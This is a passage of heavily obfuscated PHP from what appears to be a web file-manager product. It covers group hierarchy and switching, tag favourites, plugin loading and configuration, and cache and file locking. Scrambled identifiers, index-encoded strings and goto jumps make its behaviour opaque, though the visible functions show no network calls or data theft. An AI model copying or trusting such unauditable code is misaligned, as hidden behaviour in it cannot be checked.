$£¬–¹ëã[$¼¨éÂÀ]; } } return $ü–¸Õ²; } protected function isParentOf($©ÜÅ÷À, $™é´ ®î) { $‘åØãµ¯ =& $_SERVER[É¨™èà]; if (!$©ÜÅ÷À || !$™é´ ®î || $©ÜÅ÷À == $™é´ ®î) { return !1; } $¸„¥Ÿ¼Â = $this->getInfoSimple($©ÜÅ÷À); $Ø¼¥óû = $this->getInfoSimple($™é´ ®î); $¸Å¨¾® = $¸„¥Ÿ¼Â[$‘åØãµ¯[596]] . $©ÜÅ÷À . $‘åØãµ¯[50]; if (substr($Ø¼¥óû[$‘åØãµ¯[596]], 0, strlen($¸Å¨¾®)) == $¸Å¨¾®) { return !0; } return !1; } public function groupShowRoot($¬½ŞÛ¦¤, $„˜Õ¬âğ = false) { $Œ”ÛÁ =& $_SERVER[É¨™èà]; $÷“«éô‰ = $this->getInfo($¬½ŞÛ¦¤); if (!$÷“«éô‰) { return array(); } $Â°ºÁ¿“ = $this->parentLevelArray($÷“«éô‰[$Œ”ÛÁ[596]]); $˜ÓÄ‰ğ§ = array($¬½ŞÛ¦¤); if (count($Â°ºÁ¿“) == 0) { return $˜ÓÄ‰ğ§; } if ($„˜Õ¬âğ && count($Â°ºÁ¿“) == 1) { return $˜ÓÄ‰ğ§; } if (!$÷“«éô‰[$Œ”ÛÁ[551]] || !isset($÷“«éô‰[$Œ”ÛÁ[551]][$Œ”ÛÁ[2090]]) || $÷“«éô‰[$Œ”ÛÁ[551]][$Œ”ÛÁ[2090]] == $Œ”ÛÁ[867]) { return $this->groupShowRoot($Â°ºÁ¿“[count($Â°ºÁ¿“) - 1], $„˜Õ¬âğ); } if ($÷“«éô‰[$Œ”ÛÁ[551]][$Œ”ÛÁ[2090]] == $Œ”ÛÁ[443]) { $¯ùÏ¶áƒ = explode($Œ”ÛÁ[50], $÷“«éô‰[$Œ”ÛÁ[551]][$Œ”ÛÁ[2091]]); if ($¯ùÏ¶áƒ) { $˜ÓÄ‰ğ§ = array_merge($˜ÓÄ‰ğ§, $¯ùÏ¶áƒ); } } return $˜ÓÄ‰ğ§; } protected function resetParentLevel() { $ÎËÊ¢óû =& $_SERVER[É¨™èà]; $‚˜—£Í» = $ÎËÊ¢óû[1410]; $”Ì“´°· = $this->select(); $”Ì“´°· = array_to_keyvalue($”Ì“´°·, $‚˜—£Í»); foreach ($”Ì“´°· as $ö¾æ˜Øæ) { $±ËÙùÊî = $ö¾æ˜Øæ; $ñµ¤÷‰à = array(); while ($±ËÙùÊî[$ÎËÊ¢óû[193]] != 0) { $ñµ¤÷‰à[] = $±ËÙùÊî[$ÎËÊ¢óû[193]]; $±ËÙùÊî = $”Ì“´°·[$±ËÙùÊî[$ÎËÊ¢óû[193]]]; } $ñµ¤÷‰à[] = 0; $ñµ¤÷‰à = $ÎËÊ¢óû[50] . implode($ÎËÊ¢óû[50], array_reverse($ñµ¤÷‰à)) . $ÎËÊ¢óû[50]; $this->setNamePinyin($ö¾æ˜Øæ[$‚˜—£Í»], $ö¾æ˜Øæ[$ÎËÊ¢óû[32]]); $this->where(array($‚˜—£Í» => $ö¾æ˜Øæ[$‚˜—£Í»]))->save(array($ÎËÊ¢óû[667] => $ñµ¤÷‰à)); } return $”Ì“´°·; } public function groupNameAuto($†»š˜Ï­, $„ÅîÃù§) { $¨ó‡ºÏü =& $_SERVER[É¨™èà]; $÷ùº‹ÃŠ = $this->where(array($¨ó‡ºÏü[487] => $†»š˜Ï­))->getField($¨ó‡ºÏü[32], !0); if (!$÷ùº‹ÃŠ || !in_array($„ÅîÃù§, $÷ùº‹ÃŠ)) { return $„ÅîÃù§; } for ($Ó›Õ„ãÎ = 1; $Ó›Õ„ãÎ <= count($÷ùº‹ÃŠ) + 1; $Ó›Õ„ãÎ++) { $ığÜ° = $„ÅîÃù§ . "\x28{$Ó›Õ„ãÎ}\x29"; if (!in_array($ığÜ°, $÷ùº‹ÃŠ)) { return $ığÜ°; } } } public function groupSwitch($éë¬Éñ•, $ú§¼¨ìà) { $½Ö±Šá¢ =& $_SERVER[É¨™èà]; $©–¡Òá† = array($½Ö±Šá¢[1410] => array($½Ö±Šá¢[7], array($éë¬Éñ•, $ú§¼¨ìà))); $ƒ—’›Ê³ = $this->where($©–¡Òá†)->select(); $ƒ—’›Ê³ = array_to_keyvalue($ƒ—’›Ê³, $½Ö±Šá¢[1410]); if (!isset($ƒ—’›Ê³[$éë¬Éñ•]) || !isset($ƒ—’›Ê³[$ú§¼¨ìà]) || $ƒ—’›Ê³[$éë¬Éñ•][$½Ö±Šá¢[193]] == 0) { return !1; } $©–¡Òá† = array($½Ö±Šá¢[1410] => $éë¬Éñ•); $½Í°ÂÊ¤ = Model($½Ö±Šá¢[2094])->where($©–¡Òá†)->select(); if (!$½Í°ÂÊ¤) { $½Í°ÂÊ¤ = array(); } foreach ($½Í°ÂÊ¤ as $¤ ºç”) { $ÁÃá×‡ƒ = $¤ ºç”[$½Ö±Šá¢[1800]]; $©–¡Òá† = array($½Ö±Šá¢[1800] => $ÁÃá×‡ƒ, $½Ö±Šá¢[1410] => $ú§¼¨ìà); $“ş¾øÄÊ = Model($½Ö±Šá¢[2094])->where($©–¡Òá†)->find(); if (!$“ş¾øÄÊ) { $Û†›ŸÁº = array($ú§¼¨ìà => $¤ ºç”[$½Ö±Šá¢[2108]]); Model($½Ö±Šá¢[609])->userGroupAdd($ÁÃá×‡ƒ, $Û†›ŸÁº); } Model($½Ö±Šá¢[609])->userGroupRemove($ÁÃá×‡ƒ, $éë¬Éñ•); } $©–¡Òá† = array($½Ö±Šá¢[191] => 2, $½Ö±Šá¢[193] => 0, $½Ö±Šá¢[495] => 1, $½Ö±Šá¢[581] => array($½Ö±Šá¢[7], array($éë¬Éñ•, $ú§¼¨ìà))); $ñïˆõ—š = Model($½Ö±Šá¢[921])->where($©–¡Òá†)->field($½Ö±Šá¢[2109])->select(); $ñïˆõ—š = array_to_keyvalue($ñïˆõ—š, $½Ö±Šá¢[581], $½Ö±Šá¢[194]); $ä§Â› = !empty($ñïˆõ—š[$éë¬Éñ•]) ? $ñïˆõ—š[$éë¬Éñ•] : !1; if ($ä§Â›) { if (!$ñïˆõ—š[$ú§¼¨ìà]) { $ñïˆõ—š[$ú§¼¨ìà] = Model($½Ö±Šá¢[921])->groupRootAdd($ú§¼¨ìà); } $ŸÖ¼ı²é = $ñïˆõ—š[$ú§¼¨ìà]; $©–¡Òá† = array($½Ö±Šá¢[193] => $ä§Â›); $ñïˆõ—š = Model($½Ö±Šá¢[921])->where($©–¡Òá†)->field($½Ö±Šá¢[2110])->select(); if (!$ñïˆõ—š) { $ñïˆõ—š = array(); } Model($½Ö±Šá¢[921])->moveClearAuth = !1; foreach ($ñïˆõ—š as $íøıõÍ„) { $ú¤Åíï = $íøıõÍ„[$½Ö±Šá¢[495]] == $½Ö±Šá¢[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($½Ö±Šá¢[921])->move($íøıõÍ„[$½Ö±Šá¢[194]], $ŸÖ¼ı²é, $ú¤Åíï); } Model($½Ö±Šá¢[921])->moveClearAuth = !0; $©–¡Òá† = array($½Ö±Šá¢[191] => 2, $½Ö±Šá¢[581] => $éë¬Éñ•); $£ñò£¸— = array($½Ö±Šá¢[581] => $ú§¼¨ìà); Model($½Ö±Šá¢[2111])->where($©–¡Òá†)->save($£ñò£¸—); Model($½Ö±Šá¢[2112])->where($©–¡Òá†)->save($£ñò£¸—); } $this->_changeChildLevel($ƒ—’›Ê³[$éë¬Éñ•], $ƒ—’›Ê³[$ú§¼¨ìà], !0); $this->where(array($½Ö±Šá¢[193] => $éë¬Éñ•))->save(array($½Ö±Šá¢[193] => $ú§¼¨ìà)); $this->_clearChildrenCache($ƒ—’›Ê³[$ú§¼¨ìà]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($Ë­¹ñÖŠ) { $û×Ÿñô =& $_SERVER[É¨™èà]; return array($û×Ÿñô[2113] => array($Ë­¹ñÖŠ[0], $û×Ÿñô[2114]), $û×Ÿñô[2115] => array($Ë­¹ñÖŠ[0], $û×Ÿñô[2116])); } protected function get($‡ÛŞñâ) { $ßÏ…¹¶ =& $_SERVER[É¨™èà]; $ÏÅÊãÆ = Model($ßÏ…¹¶[597])->metaGet($‡ÛŞñâ, $ßÏ…¹¶[2117]); $“”“„ï† = json_decode($ÏÅÊãÆ, !0); return $“”“„ï† ? $“”“„ï† : array($ßÏ…¹¶[2118] => $ßÏ…¹¶[91], $ßÏ…¹¶[456] => array()); } protected function set($·¾Í³»İ, $ÛºÏØ×„) { $şü•ÂÔ• =& $_SERVER[É¨™èà]; $ÛºÏØ×„ = $ÛºÏØ×„ ? $ÛºÏØ×„ : array($şü•ÂÔ•[2118] => $şü•ÂÔ•[91], $şü•ÂÔ•[456] => array()); return Model($şü•ÂÔ•[597])->metaSet($·¾Í³»İ, $şü•ÂÔ•[2117], json_encode($ÛºÏØ×„)); } protected function getByTagID($òø³‹À­, $ÛİÁÛ‚Ú) { $ã°íêƒú =& $_SERVER[É¨™èà]; if (!$òø³‹À­ || !$ÛİÁÛ‚Ú) { return !1; } if (!Model($ã°íêƒú[597])->getInfoSimple($òø³‹À­)) { return !1; } $–ëËˆå¢ = $this->get($òø³‹À­); if (!$–ëËˆå¢ || !isset($–ëËˆå¢[$ã°íêƒú[456]])) { return !1; } $ß¦Ïä¥” = array_find_by_field($–ëËˆå¢[$ã°íêƒú[456]], $ã°íêƒú[485], $ÛİÁÛ‚Ú); return is_array($ß¦Ïä¥”) ? $ß¦Ïä¥” : !1; } public function listSource($–ë¦µ¹à, $›°¡ó†‚) { $Ÿ€ÀÁ–Ö =& $_SERVER[É¨™èà]; if ($›°¡ó†‚ && !is_array($›°¡ó†‚)) { $›°¡ó†‚ = array($›°¡ó†‚); } $˜ğğ©“ê = $this->listData($–ë¦µ¹à); $˜ÑòË = array(); foreach ($˜ğğ©“ê as $ÆÎÑÄ) { $÷ĞÅªò€ = $ÆÎÑÄ[$Ÿ€ÀÁ–Ö[87]]; if (!$÷ĞÅªò€) { continue; } if (!isset($˜ÑòË[$÷ĞÅªò€])) { $˜ÑòË[$÷ĞÅªò€] = array(); } $˜ÑòË[$÷ĞÅªò€][] = $ÆÎÑÄ[$Ÿ€ÀÁ–Ö[510]]; } $†ÔşÉ±ã = array(); foreach ($˜ÑòË as $°©ú†‰ => $ßĞôÆô‡) { $Ç»äæñ™ = !0; if (!$›°¡ó†‚) { $†ÔşÉ±ã[] = $°©ú†‰; continue; } foreach ($›°¡ó†‚ as $‚–ÜüÍÖ) { if (!in_array($‚–ÜüÍÖ, $ßĞôÆô‡)) { $Ç»äæñ™ = !1; break; } } if ($Ç»äæñ™) { $†ÔşÉ±ã[] = $°©ú†‰; } } if (!$†ÔşÉ±ã) { return array(); } $±ô¦«Ã° = array($Ÿ€ÀÁ–Ö[501] => array($Ÿ€ÀÁ–Ö[502], $†ÔşÉ±ã), $Ÿ€ÀÁ–Ö[581] => $–ë¦µ¹à, $Ÿ€ÀÁ–Ö[191] => SourceModel::TYPE_GROUP); $¦ÇÓ€è = Model($Ÿ€ÀÁ–Ö[1448])->listSource($±ô¦«Ã°); if (!$¦ÇÓ€è || count($†ÔşÉ±ã) == $¦ÇÓ€è[$Ÿ€ÀÁ–Ö[453]][$Ÿ€ÀÁ–Ö[454]]) { return $¦ÇÓ€è; } $„­“ñÃÌ = array(); $Òíô×Ò = array_to_keyvalue($¦ÇÓ€è[$Ÿ€ÀÁ–Ö[85]], $Ÿ€ÀÁ–Ö[12], $Ÿ€ÀÁ–Ö[194]); $šÁÏÙ§À = array_to_keyvalue($¦ÇÓ€è[$Ÿ€ÀÁ–Ö[86]], $Ÿ€ÀÁ–Ö[12], $Ÿ€ÀÁ–Ö[194]); $ÑĞµòÂ½ = array_merge($šÁÏÙ§À, $Òíô×Ò); foreach ($†ÔşÉ±ã as $÷ĞÅªò€) { if (!in_array($÷ĞÅªò€, $ÑĞµòÂ½)) { $„­“ñÃÌ[] = $÷ĞÅªò€; } } if ($„­“ñÃÌ) { $this->removeBySource($–ë¦µ¹à, $„­“ñÃÌ); } return $¦ÇÓ€è; } protected function listData($†Ñ¸Óö¾) { $×ÔÄ¸º‚ =& $_SERVER[É¨™èà]; $Õˆ…ÍÒ¨ = array($×ÔÄ¸º‚[1791] => 0, $×ÔÄ¸º‚[569] => array($×ÔÄ¸º‚[2119], 0), $×ÔÄ¸º‚[506] => $×ÔÄ¸º‚[1406] . $†Ñ¸Óö¾); $—ÇÄì = $×ÔÄ¸º‚[2120]; $ìÖÍè¸ª = $this->field($—ÇÄì)->where($Õˆ…ÍÒ¨)->order($×ÔÄ¸º‚[2121])->select(); return $ìÖÍè¸ª ? $ìÖÍè¸ª : array(); } protected function addToTag($ûû§ó­˜, $ßØºÏØ, $äêŸüÆŠ) { $â¤’´† =& $_SERVER[É¨™èà]; if (!$this->getByTagID($ûû§ó­˜, $äêŸüÆŠ) || !$ßØºÏØ) { return !1; } if (!Model($â¤’´†[921])->pathInfo($ßØºÏØ)) { return !1; } $ß§«™âí = array($â¤’´†[1791] => 0, $â¤’´†[569] => $äêŸüÆŠ, $â¤’´†[505] => $ßØºÏØ, $â¤’´†[506] => $â¤’´†[2122] . $ûû§ó­˜, $â¤’´†[504] => $â¤’´†[12], $â¤’´†[2003] => 0); if ($this->where($ß§«™âí)->find()) { return !1; } return $this->add($ß§«™âí); } protected function removeFromTag($ÇÙÃ§ó¢, $ÅÂË¹Ğ, $èÅû²î) { $ó€æ‘±í =& $_SERVER[É¨™èà]; if (!$this->getByTagID($ÇÙÃ§ó¢, $èÅû²î) || !$ÅÂË¹Ğ) { return !1; } if (is_array($ÅÂË¹Ğ)) { $ÅÂË¹Ğ = array($ó€æ‘±í[7], $ÅÂË¹Ğ); } $éÍ§ùçÖ = array($ó€æ‘±í[1791] => 0, $ó€æ‘±í[569] => $èÅû²î, $ó€æ‘±í[506] => $ó€æ‘±í[2122] . $ÇÙÃ§ó¢, $ó€æ‘±í[505] => $ÅÂË¹Ğ); return $this->where($éÍ§ùçÖ)->delete(); } protected function removeByTag($¤ì£äÃÍ, $£“¨Åñ) { $¤ùëŞÇŒ =& $_SERVER[É¨™èà]; if (!$this->getByTagID($¤ì£äÃÍ, $£“¨Åñ)) { return !1; } $ïœ†½Î¯ = array($¤ùëŞÇŒ[1791] => 0, $¤ùëŞÇŒ[569] => $£“¨Åñ, $¤ùëŞÇŒ[506] => $¤ùëŞÇŒ[2122] . $¤ì£äÃÍ); return $this->where($ïœ†½Î¯)->delete(); } protected function removeBySource($¡ªáîÆó, $¸‡ó«¿) { $€¦ˆ©Ó =& $_SERVER[É¨™èà]; if (!$¡ªáîÆó || !$¸‡ó«¿) { return !1; } if (is_array($¸‡ó«¿)) { $¸‡ó«¿ = array($€¦ˆ©Ó[7], $¸‡ó«¿); } $î‘‡ÓŠË = array($€¦ˆ©Ó[1791] => 0, $€¦ˆ©Ó[505] => $¸‡ó«¿, $€¦ˆ©Ó[569] => array($€¦ˆ©Ó[1108], 0), $€¦ˆ©Ó[506] => $€¦ˆ©Ó[2122] . $¡ªáîÆó); return $this->where($î‘‡ÓŠË)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\x70\x6c\x75\x67\151\156\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\x73\164\141\x74\165\x73", "\162\145\147\151\145\163\164", "\x63\x6f\x6e\146\151\147"); public function loadList($ŒÛïŒÔ = false) { $³üÔ™‡â = array_to_keyvalue($this->listData(), $_SERVER[É¨™èà][32]); if ($ŒÛïŒÔ) { return $³üÔ™‡â[$ŒÛïŒÔ]; } return $³üÔ™‡â; } public function init() { $£ûÀ°ÑÈ =& $_SERVER[É¨™èà]; Hook::trigger($£ûÀ°ÑÈ[2123]); $¬Úê˜ù = $this->loadPluginList(); foreach ($¬Úê˜ù as $á‰Õˆ¿ù => $™¶„ı¿ã) { $¼Üíåçš = $this->appAllow($á‰Õˆ¿ù, $™¶„ı¿ã); if (!$¼Üíåçš) { continue; } foreach ($™¶„ı¿ã[$£ûÀ°ÑÈ[2124]] as $÷Ë‘ğôÂ => $ˆëßÈæ§) { Hook::bind($÷Ë‘ğôÂ, $ˆëßÈæ§); } } Hook::trigger($£ûÀ°ÑÈ[2125]); Hook::trigger(ACTION); } public function appAllow($ê–§÷È, $¤ÕôßÛÜ, $Ø¿Ñ½ß¾ = true) { $’ƒüÏšë =& $_SERVER[É¨™èà]; $øÓºÄëò = PLUGIN_DIR . $ê–§÷È . $’ƒüÏšë[2126]; if (!is_array($¤ÕôßÛÜ) || !is_array($¤ÕôßÛÜ[$’ƒüÏšë[2124]]) || $¤ÕôßÛÜ[$’ƒüÏšë[840]] != 1 || !is_file($øÓºÄëò)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$’ƒüÏšë[6]][$’ƒüÏšë[2127]] || !$GLOBALS[$’ƒüÏšë[6]][$’ƒüÏšë[2128]]) { return !0; } $š…¨©¡ = explode($’ƒüÏšë[50], strtolower($GLOBALS[$’ƒüÏšë[6]][$’ƒüÏšë[2128]])); return in_array(strtolower($ê–§÷È), $š…¨©¡) ? !1 : !0; } if ($Ø¿Ñ½ß¾ && !Action($’ƒüÏšë[2129])->checkAuth($ê–§÷È)) { return !1; } return !0; } public function unInstall($ü—Õ‰) { $„Ê²àí =& $_SERVER[É¨™èà]; $‚Ğ®Ÿ¿¿ = $this->loadList($ü—Õ‰); if (file_exists(PLUGIN_DIR . $ü—Õ‰)) { Hook::apply($ü—Õ‰ . $„Ê²àí[2130]); } $this->remove($‚Ğ®Ÿ¿¿[$„Ê²àí[485]]); } public function changeStatus($Â½á…Öñ, $°‰´µ‹) { $ò­§°‚Æ =& $_SERVER[É¨™èà]; $ÒŠ›¾×º = $this->loadList($Â½á…Öñ); if ($°‰´µ‹) { Hook::apply($Â½á…Öñ . $ò­§°‚Æ[2131]); } $this->update($ÒŠ›¾×º[$ò­§°‚Æ[485]], array($ò­§°‚Æ[2132] => $°‰´µ‹)); } public function appRegist($ıÛ€»¾ù, $šíàıú®) { $—¥Àé =& $_SERVER[É¨™èà]; $‰º¬«§ª = $this->loadList($ıÛ€»¾ù); if ($‰º¬«§ª) { $this->update($‰º¬«§ª[$—¥Àé[485]], array($—¥Àé[2124] => $šíàıú®)); } else { $ÏÈ×ûøÙ = array($—¥Àé[32] => $ıÛ€»¾ù, $—¥Àé[2124] => $šíàıú®, $—¥Àé[840] => 0, $—¥Àé[6] => $this->getConfigDefault($ıÛ€»¾ù)); $this->insert($ÏÈ×ûøÙ); } } public function getConfigDefault($³–×„¬´) { $Ô¥…¤¥Ÿ =& $_SERVER[É¨™èà]; $Ö‰‰Ğ«ø = array(); $ˆ‹…È‡ô = $this->getPackageJson($³–×„¬´); if (!$ˆ‹…È‡ô && is_array($ˆ‹…È‡ô[$Ô¥…¤¥Ÿ[2133]])) { return $Ö‰‰Ğ«ø; } foreach ($ˆ‹…È‡ô[$Ô¥…¤¥Ÿ[2133]] as $Â“ÆïÑ¤ => $¹–Äğ—é) { if (!isset($¹–Äğ—é[$Ô¥…¤¥Ÿ[461]]) || isset($Ö‰‰Ğ«ø[$Â“ÆïÑ¤])) { continue; } $Ö‰‰Ğ«ø[$Â“ÆïÑ¤] = $¹–Äğ—é[$Ô¥…¤¥Ÿ[461]]; } return $Ö‰‰Ğ«ø; } public function getPackageJson($û×şã·¢) { return Hook::apply($û×şã·¢ . $_SERVER[É¨™èà][2134]); } public function getConfig($ñÈÙ“òÔ, $œõÍ¼Ê½ = false) { $¤ä´¡é‹ =& $_SERVER[É¨™èà]; $¯õíõğ = array(); $†–ËÆ = $this->loadList($ñÈÙ“òÔ); if ($†–ËÆ && is_array($†–ËÆ[$¤ä´¡é‹[6]])) { $¯õíõğ = $†–ËÆ[$¤ä´¡é‹[6]]; } if (!$¯õíõğ || $œõÍ¼Ê½) { $¯õíõğ = $this->getConfigDefault($ñÈÙ“òÔ); } return $¯õíõğ; } public function setConfig($­ä§ªÒ, $šË§ø¢Š = false) { $ï™ó²ò =& $_SERVER[É¨™èà]; $ò­èğ¦ñ = $this->loadList($­ä§ªÒ); if (!$ò­èğ¦ñ) { return !1; } $»±Ñ‘çã = $ò­èğ¦ñ[$ï™ó²ò[6]]; if ($šË§ø¢Š == !1) { $»±Ñ‘çã = array(); $šË§ø¢Š = $this->getConfigDefault($­ä§ªÒ); } foreach ($šË§ø¢Š as $ÚĞğº‡… => $ğÕí’È×) { $»±Ñ‘çã[$ÚĞğº‡…] = is_string($ğÕí’È×) ? trim($ğÕí’È×) : $ğÕí’È×; } $this->update($ò­èğ¦ñ[$ï™ó²ò[485]], array($ï™ó²ò[6] => $»±Ñ‘çã)); } public function viewList() { $Ø³¢™‘É =& $_SERVER[É¨™èà]; $Éãéê° = $this->loadList(); $this->pluginScan($Éãéê°); $Éãéê° = $this->loadPluginList(); $î¯‡ƒ­î = array(); foreach ($Éãéê° as $ëÎ­Œâ€ => $×÷ô•ƒâ) { $×Â˜…Ç³ = $×÷ô•ƒâ; unset($×÷ô•ƒâ[$Ø³¢™‘É[2124]], $×÷ô•ƒâ[$Ø³¢™‘É[6]]); $ú€©º´Å = PLUGIN_DIR . $×÷ô•ƒâ[$Ø³¢™‘É[32]] . $Ø³¢™‘É[2126]; if (!is_file($ú€©º´Å)) { continue; } $É‡¿ÜïÈ = Hook::apply($×÷ô•ƒâ[$Ø³¢™‘É[32]] . $Ø³¢™‘É[2134]); if (!is_array($É‡¿ÜïÈ)) { continue; } $î¯‡ƒ­î[$ëÎ­Œâ€] = array_merge($×÷ô•ƒâ, $É‡¿ÜïÈ); if ($×Â˜…Ç³[$Ø³¢™‘É[6]][$Ø³¢™‘É[1712]] != $É‡¿ÜïÈ[$Ø³¢™‘É[1686]]) { Hook::apply($×÷ô•ƒâ[$Ø³¢™‘É[32]] . $Ø³¢™‘É[2131]); $×Â˜…Ç³[$Ø³¢™‘É[6]][$Ø³¢™‘É[1712]] = $É‡¿ÜïÈ[$Ø³¢™‘É[1686]]; $this->update($×÷ô•ƒâ[$Ø³¢™‘É[485]], array($Ø³¢™‘É[6] => $×Â˜…Ç³[$Ø³¢™‘É[6]])); } } return $î¯‡ƒ­î; } private function loadPluginList() { $Ùñöê =& $_SERVER[É¨™èà]; $üšÓ–À› = $this->loadList(); if (strtolower(MOD) == $Ùñöê[2135]) { return $üšÓ–À›; } $¡ş¿±”Ä = Hook::trigger($Ùñöê[2136], $üšÓ–À›); if ($üšÓ–À› && !$¡ş¿±”Ä) { die; } return $¡ş¿±”Ä ? $¡ş¿±”Ä : $üšÓ–À›; } private function pluginScan($£ã¨ÆÍã) { $Ìó³Š¶î =& $_SERVER[É¨™èà]; recursion_dir(PLUGIN_DIR, $ê‘ÅâïÆ, $Ššèœ¦û, 0); foreach ($ê‘ÅâïÆ as $óŞŸ©¤¿) { $Ï”‘¢À² = get_path_this($óŞŸ©¤¿); if (isset($£ã¨ÆÍã[$Ï”‘¢À²]) || !file_exists($óŞŸ©¤¿ . $Ìó³Š¶î[2137]) || !file_exists($óŞŸ©¤¿ . $Ìó³Š¶î[2126])) { continue; } Hook::apply($Ï”‘¢À² . $Ìó³Š¶î[2131]); } } } goto cĞñÏ·ƒ«¤; C—Œ¹–”: define($_SERVER[É¨™èà][328], 2); define($_SERVER[É¨™èà][329], 3); define($_SERVER[É¨™èà][330], 1); goto eŒµö¯½‰; D¡ÔÁ†ÉÙÄ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¨ç¹ïÑü =& $_SERVER[É¨™èà]; if (self::$handle) { return self::$handle; } $¬îú¶÷³ = $GLOBALS[$¨ç¹ïÑü[6]][$¨ç¹ïÑü[435]]; self::$timeout = $¬îú¶÷³[$¨ç¹ïÑü[937]] ? $¬îú¶÷³[$¨ç¹ïÑü[937]] : 10; $œÚÛ‚åÎ = _get($GLOBALS[$¨ç¹ïÑü[6]], $¨ç¹ïÑü[938]); $§Ë«çÁŞ = $¬îú¶÷³[$¨ç¹ïÑü[923]] ? $¬îú¶÷³[$¨ç¹ïÑü[923]] : $¨ç¹ïÑü[233]; if ($§Ë«çÁŞ == $¨ç¹ïÑü[21] && $œÚÛ‚åÎ == $¨ç¹ïÑü[13]) { $§Ë«çÁŞ = $¨ç¹ïÑü[233]; } switch ($§Ë«çÁŞ) { case $¨ç¹ïÑü[926]: self::$handle = new CacheLockRedis(); break; case $¨ç¹ïÑü[927]: self::$handle = new CacheLockMemcached(); break; case $¨ç¹ïÑü[21]: self::$handle = new CacheLockDatabase(); break; case $¨ç¹ïÑü[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¨ç¹ïÑü[939], $¨ç¹ïÑü[940]); } return self::$handle; } private static function key($¨âî¸¥’) { return $_SERVER[É¨™èà][941] . Cache::key($¨âî¸¥’); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($œŠ¡Æ»• = '') { self::$errorMsg = $œŠ¡Æ»•; } public static function lockGlobal($Ÿïó»›å, $Ì‘à˜) { return self::lock($Ÿïó»›å, $Ì‘à˜, !0); } public static function lock($¦Ò‘†×, $·Ñï”´ = false, $‘áõòûª = false) { $ê¥àè˜ú =& $_SERVER[É¨™èà]; $ğ¶²Ñ™ = self::init(); $ï•é ŞÖ = self::key($¦Ò‘†×); $·Ñï”´ = $·Ñï”´ ? $·Ñï”´ : self::$timeout; $¥Ü¾ÒîÂ = timeFloat(); if (_get($GLOBALS, $ê¥àè˜ú[942], !1)) { if (!$ğ¶²Ñ™->lock($ï•é ŞÖ, 0.2)) { die; } return !0; } $¨øĞ¼’ = $ğ¶²Ñ™->lock($ï•é ŞÖ, $·Ñï”´); $²ç¢×ğ = timeFloat(); if (!$¨øĞ¼’) { $ï¤¨“™ô = "\x6c\x6f\x63\153\40\x65\162\x72\157\162\73\153\x65\171\75{$¦Ò‘†×}\73\x74\151\155\145\x3d{$·Ñï”´}\73" . self::$errorMsg . $ê¥àè˜ú[74] . get_caller_msg(); $«ïØ‰‚ = LNG($ê¥àè˜ú[943]) . "\50{$·Ñï”´}\163\51\x2e" . LNG($ê¥àè˜ú[944]); $«ïØ‰‚ .= $ê¥àè˜ú[945]; if (is_string(self::$errorMsg) && self::$errorMsg) { $«ïØ‰‚ = $«ïØ‰‚ . $ê¥àè˜ú[946] . self::$errorMsg; } write_log($ê¥àè˜ú[947] . sprintf($ê¥àè˜ú[948], timeFloat() - $¥Ü¾ÒîÂ) . $ê¥àè˜ú[949] . $ï¤¨“™ô . $ê¥àè˜ú[950] . json_encode(error_get_last()), $ê¥àè˜ú[940]); show_json($«ïØ‰‚, !1); } if (!$‘áõòûª) { self::$lockItem[$ï•é ŞÖ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $µÙ¼İ¬ = number_format(timeFloat() - $²ç¢×ğ, 3); write_log($ê¥àè˜ú[951] . $¦Ò‘†× . $ê¥àè˜ú[952] . $µÙ¼İ¬, $ê¥àè˜ú[940]); } return $¨øĞ¼’; } public static function lockGet($”™°ğ¢) { $ëµÅÆÇÉ = self::key($”™°ğ¢); if (self::$lockItem[$ëµÅÆÇÉ]) { return self::$lockItem[$ëµÅÆÇÉ]; } return self::init()->lockGet($ëµÅÆÇÉ); } public static function unlock($ĞØíòä±) { $šıŒœİ¼ =& $_SERVER[É¨™èà]; $À´¨ª”Ö = self::key($ĞØíòä±); self::$lockItem[$À´¨ª”Ö] = null; self::init()->unlock($À´¨ª”Ö); if (GLOBAL_DEBUG_LOG_ALL) { write_log($šıŒœİ¼[953] . $ĞØíòä±, $šıŒœİ¼[940]); } return; } public static function unlockRuntime() { $£ì±ñÚ =& $_SERVER[É¨™èà]; $úşÓ¾µŒ = self::init(); $¹½àÜş÷ = !1; foreach (self::$lockItem as $ëÁÌƒıä => $Ù©Â—ç¬) { if (!$Ù©Â—ç¬) { continue; } $úşÓ¾µŒ->unlock($ëÁÌƒıä); if (!$¹½àÜş÷) { $¹½àÜş÷ = !0; write_log($£ì±ñÚ[954] . $ëÁÌƒıä . $£ì±ñÚ[74] . get_caller_msg(), $£ì±ñÚ[940]); continue; } write_log($£ì±ñÚ[954] . $ëÁÌƒıä, $£ì±ñÚ[940]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¡¿ŸºÔÃ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($£ì±ñÚ[955] . $¡¿ŸºÔÃ . $£ì±ñÚ[956] . ACTION, $£ì±ñÚ[940]); } } public static function fileLock($° úìõ) { $˜÷ñĞ³³ =& $_SERVER[É¨™èà]; if (!$GLOBALS[$˜÷ñĞ³³[957]]) { $GLOBALS[$˜÷ñĞ³³[957]] = array(); } $GLOBALS[$˜÷ñĞ³³[957]][$° úìõ] = !1; $¸ĞšÎ„ß = fopen(DATA_PATH . $° úìõ . $˜÷ñĞ³³[958], $˜÷ñĞ³³[959]); if (!$¸ĞšÎ„ß) { return !1; } $GLOBALS[$˜÷ñĞ³³[957]][$° úìõ] = $¸ĞšÎ„ß; if (flock($¸ĞšÎ„ß, LOCK_EX)) { return !0; } self::unlock($° úìõ); show_json($˜÷ñĞ³³[960], !1); return !1; } public static function fileUnlock($¤€¦Ÿáü) { $ŒàşÊû€ =& $_SERVER[É¨™èà]; $‚º…Ğı³ = $GLOBALS[$ŒàşÊû€[957]][$¤€¦Ÿáü]; if (!$‚º…Ğı³) { return; } $GLOBALS[$ŒàşÊû€[957]][$¤€¦Ÿáü] = !1; 